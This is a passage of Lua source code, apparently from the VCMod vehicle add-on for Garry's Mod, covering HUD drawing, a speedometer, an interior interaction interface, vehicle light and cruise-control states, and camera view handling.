ent:GetNWString("VC_Name", "") if data != "" then ret = data end  end  end  return ret or default end local rs7 = "vc.check_msg_work_ALS_k4" 
--PATH vcmod?hud:
function VC.HUD_DrawFade() if VC.HUD_FadeAlpha and VC.HUD_FadeAlpha > 0 then VC.HUD_FadeAlpha = VC.HUD_FadeAlpha- 20*VC.FTm() surface.SetDrawColor(0, 0, 0, VC.HUD_FadeAlpha) surface.DrawRect(0, 0, ScrW(), ScrH()) else VC.HUD_FadeAlpha = nil end end  if !VC.DrawFT then VC.DrawFT = {} end  if !VC.UI_AnimDataInfo then VC.UI_AnimDataInfo = {} end function VC.UI_AnimData(key, On, IncS, DecS)  local tdata = VC.UI_AnimDataInfo[key]  if On then  if !tdata then VC.UI_AnimDataInfo[key] = 0 tdata = 0 end   local change = IncS*VC.FTm() if change <= 0 then change = 0.001 end if tdata < 1 then VC.UI_AnimDataInfo[key] = math.Round(tdata+ change, 100) if VC.UI_AnimDataInfo[key] > 1 then VC.UI_AnimDataInfo[key] = 1 end end   elseif tdata then  local change = DecS*VC.FTm() if change <= 0 then change = 0.001 end  VC.UI_AnimDataInfo[key] = math.Round(tdata- DecS*VC.FTm(), 100)  if VC.UI_AnimDataInfo[key] < 0 then VC.UI_AnimDataInfo[key] = nil end  end  return VC.UI_AnimDataInfo[key] end  function VC.UI_canDraw(hookName)  if hook.Call("HUDShouldDraw", GAMEMODE, hookName) == false then return false end  return true end  hook.Add("HUDPaint", "VC_HUDPaint", function()    local rtime = SysTime()  VC.FrameTime = rtime-(VC.SysTime or rtime) VC.SysTime = rtime   if !VC.UI_canDraw("VCMod") then return false end   if VC.getSetting("Enabled") then  VC.HUD_DrawFade()   local ply = LocalPlayer()   local ent = ply:GetVehicle() if !IsValid(ent) then ent = nil end  local Veh = ent and ent.VC_ExtraSeat and ent:GetParent() or ent   local DrvV = ent and VC.CheckViewerIsSelf() and !VC.isMidEnterExit(ply)   if VC.DrawFT["Damage"] and VC.UI_canDraw("VCMod_Damage") then VC.DrawFT["Damage"](ply, CARot, ent, DrvV, Veh, Sart_Height) end  if VC.getSetting("HUD_PickUp") and VC.UI_canDraw("VCMod_Entity") and vcmod1 then VC.DrawFT["PickUp"](ply, CARot, ent, DrvV, Veh, Sart_Height) end  if VC.DrawFT["Fuel Lid Pos"] and VC.UI_canDraw("VCMod_FuelLid")then VC.DrawFT["Fuel Lid Pos"](ply, CARot, ent, DrvV, Veh, Sart_Height) end   if Veh and !Veh.VC_isSupported then return end   local CARot = {0,0}  if VC.getSetting("HUD_3D") then local AnChng = EyeAngles()-(VC.HUD_PAng or EyeAngles()) VC.HUD_PAng = EyeAngles() VC.HUD_AngRot = LerpAngle(0.2*VC.getSetting("HUD_3D_Mult"), VC.HUD_AngRot or AnChng, AnChng) CARot = {VC.HUD_AngRot.y, VC.HUD_AngRot.p} if CARot[1] < 0.0001 and CARot[2] < 0.0001 then CARot = {0,0} end end   if !VC_DG_HUD_Side and VC.UI_canDraw("VCMod_Side") then  local Sart_Height = Lerp(VC.getSetting("HUD_Height", 3.5)/100, 0, ScrH())  local Lrp = 1 local SrnTbl = ent and VC.GetModel(ent) and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).Siren  if vcmod1 then  if QD_VCModHUD then  if QD_VCModHUD_Name then QD_VCModHUD_Name(ply, CARot, ent, DrvV, Veh, Sart_Height) end  else    if VC.getSetting("HUD_Name") and VC.UI_canDraw("VCMod_Name") then VC.DrawFT["Name"](ply, CARot, ent, DrvV, Veh, Sart_Height) end  if VC.getSetting("HUD_Cruise") and VC.UI_canDraw("VCMod_Cruise") then VC.DrawFT["Cruise"](ply, CARot, ent, DrvV, Veh, Sart_Height) end  if VC.getSetting("HUD_Icons") and VC.UI_canDraw("VCMod_Icons") then Sart_Height = VC.DrawFT["Icons"](ply, CARot, ent, DrvV, Veh, Sart_Height, Lrp, SrnTbl) Lrp = Lrp+1 end  if VC.getSetting("HUD_Health") and VC.UI_canDraw("VCMod_Health") then Sart_Height = VC.DrawFT["Health"](ply, CARot, ent, DrvV, Veh, Sart_Height, Lrp, SrnTbl) Lrp = Lrp+1 end  if VC.getSetting("HUD_Fuel") and VC.UI_canDraw("VCMod_Fuel") then Sart_Height = VC.DrawFT["Fuel"](ply, CARot, ent, DrvV, Veh, Sart_Height, Lrp, SrnTbl) Lrp = Lrp+1 end  if VC.getSetting("HUD_DriveBy") and VC.UI_canDraw("VCMod_DriveBy") then VC.DrawFT["DriveBy"](ply, CARot, ent, DrvV, Veh, Sart_Height, Lrp, SrnTbl) Lrp = Lrp+1 end  end  end  if vcmod1_els then  if VC.BGroups_Check(ent, "ELS Sound", SrnTbl and SrnTbl.Sound_BGroups) and VC.UI_canDraw("VCMod_ELS_Siren") then  Sart_Height = VC.DrawFT["ELS_Siren"](ply, CARot, ent, DrvV, Veh, Sart_Height, Lrp, SrnTbl) Lrp = Lrp+1  end  if VC.BGroups_Check(ent, "ELS Sections", SrnTbl and SrnTbl.Sections_BGroups) and VC.UI_canDraw("VCMod_ELS_Lights") then  Sart_Height = VC.DrawFT["ELS_Lights"](ply, CARot, ent, DrvV, Veh, Sart_Height, Lrp, SrnTbl) Lrp = Lrp+1  end  end  end      if VC.Local and VC.UI_canDraw("VCMod_Speedometer") then  VC.DrawFT["Speedo"](ply, CARot, ent, DrvV, Veh, Sart_Height)  end     if VC.CD and VC.CD.HUDPaint then VC.CD.HUDPaint() end  if VC.RM and VC.RM.HUDPaint then VC.RM.HUDPaint() end  end end)    VC.dataSpeedo = {}  local nData = {} nData.draw = function() end  VC.dataSpeedo["default"] = nData  VC.dataSpeedoCur = VC.dataSpeedo["default"]  local mats = {} local name = "body_outer" mats[name] = Material("vcmod/hud/speedo/default/"..name..".png") local name = "body_inner" mats[name] = Material("vcmod/hud/speedo/default/"..name..".png") local name = "body_fill" mats[name] = Material("vcmod/hud/speedo/default/"..name..".png") local name = "body_fill_extra" mats[name] = Material("vcmod/hud/speedo/default/"..name..".png") local name = "extra" mats[name] = Material("vcmod/hud/speedo/default/"..name..".png") local name = "spikes" mats[name] = Material("vcmod/hud/speedo/default/"..name..".png") local name = "numbers_200" mats[name] = Material("vcmod/hud/speedo/default/"..name..".png")  VC.DrawFT["Speedo"] = function(ply, CARot, ent, DrvV, GVeh, Sart_Height, Lrp, SrnTbl)  local data = VC.dataSpeedoCur if !data then return end  local pos = LocalPlayer():GetPos();  local size = 300  local pos = {}  pos.x = ScrW()-size/2-50  pos.y = ScrH()-size/2       surface.SetDrawColor(255,255,255,255)   surface.SetMaterial(mats["body_fill"])  surface.DrawTexturedRectRotated(pos.x, pos.y, size, size, 0)      surface.SetDrawColor(255,255,255,255) surface.SetDrawColor(VC.Color.Accent_Light.r,VC.Color.Accent_Light.g,VC.Color.Accent_Light.b,255)  surface.SetMaterial(mats["body_fill_extra"])  surface.DrawTexturedRectRotated(pos.x, pos.y, size, size, 0)      surface.SetDrawColor(255,255,255,255)   surface.SetMaterial(mats["spikes"])  surface.DrawTexturedRectRotated(pos.x, pos.y, size, size, 0)     surface.SetDrawColor(255,255,255,255) surface.SetDrawColor(VC.Color.Accent_Light.r,VC.Color.Accent_Light.g,VC.Color.Accent_Light.b,255)  surface.SetMaterial(mats["body_inner"])  surface.DrawTexturedRectRotated(pos.x, pos.y, size, size, 0)     surface.SetDrawColor(255,255,255,255)   surface.SetMaterial(mats["body_outer"])  surface.DrawTexturedRectRotated(pos.x, pos.y, size, size, 0)     surface.SetDrawColor(255,255,255,255)   surface.SetMaterial(mats["numbers_200"])  surface.DrawTexturedRectRotated(pos.x, pos.y, size, size, 0)      surface.SetDrawColor(255,255,255,255)   surface.SetMaterial(mats["extra"])  surface.DrawTexturedRectRotated(pos.x, pos.y, size, size, 0)   end                   VC.UI_InterData = {} VC.UI_Inter_Cache = {}  function VC.UI_InterAdd(id, data)  VC.UI_InterData[id] = data end  local data = {} data.name = "Switch lights" data.desc = "Controls the running lights (front and rear) and the low beams." data.cmd = "vc_lights_switch" data.type = 0 data.checkIfActive = function(ent) return true end data.checkIfCan = function(ent) return true end data.findPos = function(ent, id) return VC.UI_Inter_getPos_eyePosBased(ent, id) end VC.UI_InterAdd(data.cmd, data)  local data = {} data.name = "Horn" data.desc = "Controls the horn" data.cmd = "vc_horn" data.type = 1 data.checkIfActive = function(ent) return true end data.checkIfCan = function(ent) return true end data.findPos = function(ent, id) return VC.UI_Inter_getPos_eyePosBased(ent, id) end VC.UI_InterAdd(data.cmd, data)      function VC.UI_Inter_getPos_eyePosBased(ent, id)  local ret = Vector(0,0,0)   local sData = VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent)   if sData.UI_Inter and sData.UI_Inter[id] and sData.UI_Inter and sData.UI_Inter[id].override then  if sData.UI_Inter[id].pos then ret = sData.UI_Inter[id].pos end  else  if sData.eyePos then  local semiData = VC.SemiAutoData[sData.semiAutoData]   local extra = VC_TEMPVEC or semiData and semiData.UI_Inter and semiData.UI_Inter[id] or Vector(-19.71, -11.36, 59.18)   if !sData.semiData_axleSpacing then  local val = 130   local p1, has = VC.GetWheelPos(ent, 1, 143) if !has then p1 = nil end  local p2, has = VC.GetWheelPos(ent, 3, 143) if !has then p2 = nil end  if p1 and p2 then val = p1:Distance(p2) end   sData.semiData_axleSpacingMult = math.floor(val)/130  sData.semiData_axleSpacing = val  end   ret = sData.eyePos+ Vector(sData.leftSteer and (-extra.x) or extra.x, extra.y, extra.z)*sData.semiData_axleSpacingMult  end  end   return ret end    local function UI_Inter_Refresh_Cache(mdl)     end  VC.Color.UI_Inter = VC.Color.Base VC.Color.UI_Inter_Sel = VC.Color.Accent_Light   function VC.UI_Inter_Initialize(ent)  local mdl = VC.GetModel(ent)  VC.UI_Inter_Cache[mdl] = {}  for k,data in pairs(VC.UI_InterData) do  local ndata = nil  if data.checkIfCan(ent) then  ndata = table.Copy(data)  ndata.pos = ndata.findPos(ent, k)  ndata.findPos = nil  ndata.checkIfCan = nil    end  VC.UI_Inter_Cache[mdl][data.cmd] = ndata  end end  local function UI_Inter_GetInfo(ent)  local mdl = VC.GetModel(ent)  VC.UI_Inter_Initialize(ent)    return VC.UI_Inter_Cache[mdl] end  local function UI_Inter_findPos(ent, data)  local ret = Vector(0,0,0)  local pos = data.pos if data.findPos then pos = data.findPos(ent, data) end  ret = ent:LocalToWorld(pos or Vector(0,0,0)):ToScreen()  return ret end  function VC.UI_Inter_Click(int, mdl)  if !mdl then local ent = LocalPlayer():GetVehicle() if IsValid(ent) then local mdl = ent.VC_Model end end   local data = table.Copy(VC.UI_Inter_GetAll(mdl)[int])          RunConsoleCommand(data.cmd, data.carg1 or "1")  VC.UI_Inter_Pressed = data end  function VC.UI_Inter_Unclick()  if VC.UI_Inter_Pressed then   local data = VC.UI_Inter_Pressed   if data.Carg2 then    end   VC.UI_Inter_Pressed = nil  end end  local function UI_Inter_LoseHover()  VC.UI_Inter_Hover = nil   VC.UI_Inter_Unclick() end  local function UI_Inter_HandleInputs(mdl)  if input.IsMouseDown(MOUSE_LEFT) then  if !VC.Input_Mouse_Left_Down then  VC.Input_Mouse_Left_Down = true  if VC.UI_Inter_Hover and !VC.UI_Inter_Pressed then VC.UI_Inter_Click(VC.UI_Inter_Hover, mdl) end  end  elseif VC.Input_Mouse_Left_Down then  VC.Input_Mouse_Left_Down = nil  VC.UI_Inter_Unclick()  end end  local function UI_Inter_HandleDrawing(k, pos)  local clr = VC.Color.UI_Inter  local size = 8  local alpha = 155   if VC.UI_Inter_Pressed then  clr = VC.Color.Good  size = 15  alpha = 255  else  if VC.UI_Inter_Hover and k == VC.UI_Inter_Hover then  clr = VC.Color.UI_Inter_Sel  size = 12  alpha = 255  end  end      surface.SetDrawColor(clr.r,clr.g,clr.b,alpha)  surface.DrawTexturedRect(pos.x-size/2, pos.y-size/2, size, size) end  local function do_UI_Inter()  if !VC.IsThirdPerson or true then  local ent = LocalPlayer():GetVehicle()  local ent = ents.FindByClass("prop_vehicle_jeep")[1]   if IsValid(ent) then  local mdl = ent.VC_Model  if mdl then  local info = UI_Inter_GetInfo(ent)              if !VC.UI_Inter_RescanTime or CurTime() >= VC.UI_Inter_RescanTime then  VC.UI_Inter_Hover = nil   local screenW, screenH = ScrW()/2, ScrH()/2  local mouse_sx, mouse_sy = gui.MousePos()  local dist, hover, mpos = 500, nil, nil   surface.SetMaterial(VC.Material.Circle_32)   for k,data in pairs(info) do  local pos = ent:LocalToWorld(data.pos or Vector(0,0,0)):ToScreen()  UI_Inter_HandleDrawing(k, pos)  if vgui.CursorVisible() then  local csize = 15  if pos.x > (mouse_sx-csize) and pos.x < (mouse_sx+csize) and pos.y > (mouse_sy-csize) and pos.y < (mouse_sy+csize) then  local cdist = Vector(pos.x, pos.y, 0):Distance(Vector(mouse_sx, mouse_sy, 0))  if cdist < dist then dist = cdist hover = k end  end  else  local csize = 50  local cdist = math.max(math.abs(pos.x-screenW), math.abs(pos.y-screenH))  if cdist < csize and cdist < dist then dist = cdist hover = k end  end  end      if hover then VC.UI_Inter_Hover = hover end  end              elseif VC.UI_Inter_Hover then UI_Inter_LoseHover()  end  elseif VC.UI_Inter_Hover then UI_Inter_LoseHover()  end  elseif VC.UI_Inter_Hover then UI_Inter_LoseHover()  end end  if vcmod_dev then  hook.Add("HUDPaint", "VC_HUDPaint_Inter", function()  if !VC.UI_canDraw("VCMod_Interior") then return end  if VC.Dev_IsFree then    if VC.Dev_Imager_Perform and VC.Dev_Imager_Perform.perform then return end  do_UI_Inter()  end  end) end local rs7 = "vc.check_msg_work_ALS_k4" 
--PATH vcmod??states_main:
VC.StateAdd("RunningLightsOn", "Running", "RunningLightsOn", "RunningLightsOff")  function VC.RunningLightsOn(ent, silent, caller)  if !VC.getServerSetting("Enabled") or !VC.getSetting("Enabled") then return end   if VC.getServerSetting("Lights_Running") and !VC.GetState(ent, "RunningLightsOn") and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable.Running then   if hook.Call("VC_canToggleLights", GAMEMODE, ent, "running", false) == false then return end   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "RunningLightsOn",true, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "lights_running", true) end  return true  end end function VC.RunningLightsOff(ent, silent, caller)  if VC.GetState(ent, "RunningLightsOn") then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "running", true) == false then return end   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "RunningLightsOn",false, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "lights_running", false) end  return true  end end      VC.StateAdd("LowBeamsOn", "LBeam", "LowBeamsOn", "LowBeamsOff")  function VC.LowBeamsOn(ent, silent, caller)  if !VC.getServerSetting("Enabled") or !VC.getSetting("Enabled") then return end   if VC.getServerSetting("HeadLights") and !VC.GetState(ent, "LowBeamsOn") and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable.LBeam then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "lowbeam", false) == false then return end   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "LowBeamsOn", true, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "lights_lowbeams", true) end  return true  end end function VC.LowBeamsOff(ent, silent, caller)  if VC.GetState(ent, "LowBeamsOn") then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "lowbeam", true) == false then return end   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "LowBeamsOn", false, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "lights_lowbeams", false) end  return true  end end      VC.StateAdd("HighBeamsOn", "HBeam", "HighBeamsOn", "HighBeamsOff")  function VC.HighBeamsOn(ent, silent, caller)  if !VC.getServerSetting("Enabled") or !VC.getSetting("Enabled") then return end   if VC.getServerSetting("HeadLights") and !VC.GetState(ent, "HighBeamsOn") and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable.HBeam then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "highbeam", false) == false then return end   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "HighBeamsOn",true, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "lights_highbeams", true) end  return true  end end function VC.HighBeamsOff(ent, silent, caller)  if VC.GetState(ent, "HighBeamsOn") then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "highbeam", true) == false then return end   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "HighBeamsOn",false, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "lights_highbeams", false) end  return true  end end      VC.StateAdd("FogLightsOn", "Fog", "FogLightsOn", "FogLightsOff")  function VC.FogLightsOn(ent, silent, caller)  if !VC.getServerSetting("Enabled") or !VC.getSetting("Enabled") then return end   if VC.getServerSetting("FogLights") and !VC.GetState(ent, "FogLightsOn") and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable.Fog then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "fog", false) == false then return end   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "FogLightsOn", true, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "lights_fog", true) end  return true  end end function VC.FogLightsOff(ent, silent, caller)  if VC.GetState(ent, "FogLightsOn") then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "fog", true) == false then return end   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "FogLightsOn", false, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "lights_fog", false) end  return true  end end      VC.StateAdd("HazardLightsOn", "Hazards", "HazardLightsOn", "HazardLightsOff")  function VC.HazardLightsOn(ent, silent, caller)  if !VC.getServerSetting("Enabled") or !VC.getSetting("Enabled") then return end   if !VC.GetState(ent, "HazardLightsOn") and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable.Blinker then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "hazards", false) == false then return end   ent.VC_TrnLOnT = nil ent.VC_TrnLOffT = 0 ent.VC_TrnROnT = nil ent.VC_TrnROffT = 0 ent.VC_HazardLightsOnT = 0 ent.VC_HazLOffT = 0   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "HazardLightsOn", true, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "lights_hazard", true) end  return true  end end function VC.HazardLightsOff(ent, silent, caller)  if VC.GetState(ent, "HazardLightsOn") then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "hazards", true) == false then return end   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "HazardLightsOn", false, nil, caller, nil, snd)  if VC.IndicationCheck then VC.IndicationCheck(ent, "lights_hazard", false) end  return true  end end      VC.StateAdd("TurnLightLeftOn", "BlinkerLeft", "TurnLightLeftOn", "TurnLightLeftOff")  function VC.TurnLightLeftOn(ent, silent, caller)  if !VC.getServerSetting("Enabled") or !VC.getSetting("Enabled") then return end   if !VC.GetState(ent, "TurnLightLeftOn") and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable.Blinker then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "blinkers_left", false) == false then return end   ent.VC_TrnLOnT = 0 ent.VC_TrnLOffT = 0   local snd = nil if !silent then snd = {VC.GetState(ent, "TurnLightRightOn") and "vcmod/switch.wav" or "vcmod/switch_on.wav"} end   VC.TurnLightRightOff(ent, true)   VC.SetStateBool(ent, "TurnLightLeftOn", true, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "blinkers_left", true) end  return true  end end function VC.TurnLightLeftOff(ent, silent, caller)  if VC.GetState(ent, "TurnLightLeftOn") then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "blinkers_left", true) == false then return end   local snd = nil if !silent then snd = {"vcmod/switch_off.wav"} end  VC.SetStateBool(ent, "TurnLightLeftOn", false, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "blinkers_left", false) end  return true  end end      VC.StateAdd("TurnLightRightOn", "BlinkerRight", "TurnLightRightOn", "TurnLightRightOff")  function VC.TurnLightRightOn(ent, silent, caller)  if !VC.getServerSetting("Enabled") or !VC.getSetting("Enabled") then return end   if !VC.GetState(ent, "TurnLightRightOn") and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable and VC_asi3e18505c6fdde124627e9fa198ee180bAa3S(ent).LightTable.Blinker then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "blinkers_right", false) == false then return end   ent.VC_TrnLOnT = 0 ent.VC_TrnLOffT = 0   local snd = nil if !silent then snd = {VC.GetState(ent, "TurnLightLeftOn") and "vcmod/switch.wav" or "vcmod/switch_on.wav"} end   VC.TurnLightLeftOff(ent, true)   VC.SetStateBool(ent, "TurnLightRightOn", true, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "blinkers_right", true) end   return true  end end function VC.TurnLightRightOff(ent, silent, caller)  if VC.GetState(ent, "TurnLightRightOn") then  if hook.Call("VC_canToggleLights", GAMEMODE, ent, "blinkers_right", true) == false then return end   local snd = nil if !silent then snd = {"vcmod/switch_off.wav"} end  VC.SetStateBool(ent, "TurnLightRightOn", false, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "blinkers_right", false) end  return true  end end      VC.StateAdd("CruiseOn", "Cruiser", "CruiseOn", "CruiseOff")  function VC.CruiseOn(ent, silent, caller)  if !VC.getServerSetting("Enabled") or !VC.getSetting("Enabled") then return end   if hook.Call("VC_canUseCruiseControl", GAMEMODE, caller, ent) == false then return end  if VC.ElectronicsOn(ent) and !VC.GetState(ent, "CruiseOn") and ent.VC_IsNotPrisonerPod and VC.getServerSetting("Cruise_Enabled") then  ent.VC_CruiseVel = ent.VC_Speed_Forward or 0 if ent.VC_CruiseVel < 50 then ent.VC_CruiseVel = 50 end ent:SetNWInt("VC_Cruise_Spd", ent.VC_CruiseVel)   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "CruiseOn", true, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "cruise", true) end  return true  end end function VC.CruiseOff(ent, silent, caller)  if VC.GetState(ent, "CruiseOn") then   ent.VC_CruiseVel = nil ent:SetNWInt("VC_Cruise_Spd", 0)   local snd = nil if !silent then snd = {"c"} end  VC.SetStateBool(ent, "CruiseOn", false, nil, caller, nil, snd)   if VC.IndicationCheck then VC.IndicationCheck(ent, "cruise", false) end  return true  end end      function VC.HeadLightsOn(ent, silent, caller) VC.LowBeamsOn(ent, silent, caller) end function VC.HeadLightsOff(ent, silent, caller) VC.LowBeamsOff(ent, silent, caller) VC.HighBeamsOff(ent, silent, caller) end function VC.HL_HighBeam_On(ent, silent, caller) VC.HighBeamsOn(ent, silent, caller) end function VC.HL_HighBeam_Off(ent, silent, caller) VC.HighBeamsOff(ent, silent, caller) end local rs7 = "vc.check_msg_work_ALS_k4" 
--PATH vcmod?view:
local View_Auto_InOutInt = 0 local function View_Handle_Auto(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View)  local LookBehind = VC.View_LookingBehind and !vgui.CursorVisible() if LookBehind then VC.View_Auto_LastLookBehind = CurTime()+0.5 end local LookBehindRev = nil if VC.View_Auto_LastLookBehind and CurTime() < VC.View_Auto_LastLookBehind then LookBehindRev = true else VC.View_Auto_LastLookBehind = nil end   if LookBehind or LookBehindRev or !CursorVis and (VC.getSetting("ThirdPerson_Auto") and VC.IsThirdPerson and VC.getSetting("ThirdPerson_Ang_Stf") > 0 or VC.getSetting("FirstPerson_Auto") and !VC.IsThirdPerson and VC.getSetting("FirstPerson_Ang_Stf") > 0 and !ply.VC_InGunMode) and !Veh.VC_IsAirboat and CurTime() >= (ply.VC_View_LastMouseMovedTime or (CurTime()+ 1))+ (VC.velAvg:Length() >= 50 and 1.5 or ply.VC_LEAACR) then  local LBP = nil if !VC.IsThirdPerson then LBP = Veh:WorldToLocal(ply:EyePos()).x > 5 and -105 or -75 else LBP = -90 end  local FAng = (VC.IsThirdPerson and VC.getSetting("ThirdPerson_Auto_Back") or !VC.IsThirdPerson and VC.getSetting("FirstPerson_Auto_Back")) and Veh == ent and (LookBehind or LookBehindRev or VCMod2 and (Veh:GetNWInt("VC_Throttle", 0) == 0 or Veh:GetNWInt("VC_Gear", 0) < 0) or input.IsKeyDown(KEY_S)) and (VC.velAvg:Dot(Veh:GetRight()) > 150 or LookBehind) and LBP or 90  if !VC.AngleInBounds(0.1, ply.VC_View_Angle_Real or ply:EyeAngles(), Angle(VC.IsThirdPerson and VC.getSetting("ThirdPerson_Auto_Pitch", 0),FAng,0)) then  local AVel = math.Clamp(VC.velAvg:Length()/(FAng > 0 and (VC.IsThirdPerson and 25000 or 22000) or (VC.IsThirdPerson and 13000 or 10000)), 0, 0.0775)  if ply.VC_APLBP and ply.VC_APLBP != FAng then View_Auto_InOutInt = 0 end ply.VC_APLBP = FAng if View_Auto_InOutInt < 1 then View_Auto_InOutInt = View_Auto_InOutInt+ 0.005+ AVel*VC.FTm() end if View_Auto_InOutInt > 1 then View_Auto_InOutInt = 1 end  local CAng = LerpAngle(((LookBehind or LookBehindRev) and 0.1 or (0.003+ AVel)*View_Auto_InOutInt)*VC.FTm(), ply.VC_View_Angle_Real, (Veh:GetAngles()- ent:GetAngles())+ Angle(VC.IsThirdPerson and VC.getSetting("ThirdPerson_Auto_Pitch", 0), FAng, 0))  local PAng = ply:EyeAngles()- (ply.VC_View_Angle_Real- CAng)  ply:SetEyeAngles(Angle(PAng.p, PAng.y, ply:EyeAngles().r))  ply.VC_View_Angle_Real = Angle(CAng.p, CAng.y, ply:EyeAngles().r)  ply.VC_View_Angle_Simulated = ply:EyeAngles()  ply.VC_View_LastMouseMovedTime = 1  else  View_Auto_InOutInt = 0  end  else  View_Auto_InOutInt = 0  end  return View end  local function View_Handle_Mouse_Movement(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View)  local MMvd = false  if !ply.VC_View_Angle_Simulated or !VC.AngleInBounds(0.0001, ply.VC_View_Angle_Simulated, ply:EyeAngles()) then ply.VC_View_Angle_Real = (ply.VC_View_Angle_Real or ply:EyeAngles())+ (ply:EyeAngles()- (ply.VC_View_Angle_Simulated or ply:EyeAngles())) ply.VC_View_Angle_Simulated = ply.VC_View_Angle_Real MMvd = true end  if MMvd or !CursorVis and (input.IsMouseDown(MOUSE_LEFT) or input.IsMouseDown(MOUSE_RIGHT) or VC.View_LookingBehind) then ply.VC_View_LastMouseMovedTime = CurTime() ply.VC_LEAACR = math.random(4.5, 6) end  return MMvd end  local function View_Handle_TP_Hight_Auto(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View, Fltr, APos, APVD)  local Int = 1  if VC.getSetting("ThirdPerson_Hight_Auto") then  local CVel = VC.velAvg:Length() CVel = (CVel- 150)*0.04 if CVel < 0 then CVel = 0 end if CVel > 20 then CVel = 20 end  ply.VC_ViewTP_UpL = Lerp(0.02*VC.FTm(), ply.VC_ViewTP_UpL or CVel, CVel) Int = ply.VC_ViewTP_UpL  if !IsNotPod and VSC then Int = Int+100 end  end  return Int end  local function View_Handle_TP_Hight_Auto_Speed(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View, Fltr, APos, APVD, HMlt)  if VC.getSetting("ThirdPerson_Speed") then  APos = APos+ ang:Up()*(15+HMlt)  APos = APos- ang:Forward()*(15+HMlt)  end  return APos end  local function View_Handle_TP_Trailer(ply, ent, Veh, IsNotPod, VSC, pos, ang, fov, CursorVis, View, Fltr, APos, APVD)  local trailer = Veh:GetNWEntity("VC_HookedVh") if !IsValid(trailer) then trailer = nil end   if VC.getSetting("ThirdPerson_Cam_Trl") and trailer then  if !Veh.VC_TrlVwMult or Veh.VC_TrlVwMult < 1 then Veh.VC_TrlVwMult = math.Round(((Veh.VC_TrlVwMult or 0)+ 0.01*VC.FTm())*100)/100 end  elseif Veh.VC_TrlVwMult then  if Veh.VC_TrlVwMult > 0 then Veh.VC_TrlVwMult = math.Round((Veh.VC_TrlVwMult- 0.01*VC.FTm())*100)/100 else Veh.VC_TrlVwMult = nil end  end   if Veh.VC_TrlVwMult then  if trailer then ply.VC_TrlAPos = trailer:LocalToWorld(trailer:OBBCenter())+Veh:GetUp()*60 ply.VC_TrlAPVD = math.Max(100, trailer:BoundingRadius()) end  local VwMul = (math.sin(math.pi*(Veh.VC_TrlVwMult-0.5))+1)/2   if ply.VC_TrlAPos then APos = LerpVector(VwMul, APos, (APos+ ply.VC_TrlAPos)/2) end  if ply.VC_TrlAPVD then APVD = APVD+ply.VC_TrlAPVD*VwMul end  Fltr = {Veh, trailer}  end  return {APos = APos, APVD = APVD, Fltr = Fltr} end   VC.velAvgData = nil VC.velAvgCounter = 1 VC.velAvg = Vector(0,0,0) function VC.calculateVelAvr(ent)  local velNew = 0   if IsValid(ent) then  local vel = ent:GetVelocity()   if !VC.velAvgData then  VC.velAvgCounter = 1  VC.velAvgData = {}  VC.velAvgData[2] = vel  VC.velAvgData[3] = vel  